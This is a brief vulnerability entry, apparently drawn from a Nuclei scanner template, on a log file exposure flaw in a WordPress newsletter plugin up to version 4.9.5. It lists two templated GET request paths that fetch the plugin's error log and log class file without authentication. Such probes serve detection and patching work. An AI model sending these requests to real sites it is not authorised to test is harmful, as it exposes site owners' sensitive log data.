# Vulnerability: WordPress Newsletter - Log File Exposure
**Classification:** WORDPRESS
**Source:** Nuclei Template (`wp-newsletter-log-exposure.yaml`)

## Description
The Newsletters plugin for WordPress is vulnerable to Sensitive Information Exposure in all versions up to, and including, 4.9.5. This makes it possible for unauthenticated attackers to extract potentially sensitive information from log files.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/newsletter/error_log
GET {{BaseURL}}/wp-content/plugins/newsletter/classes/Newsletter/Logs.php
```

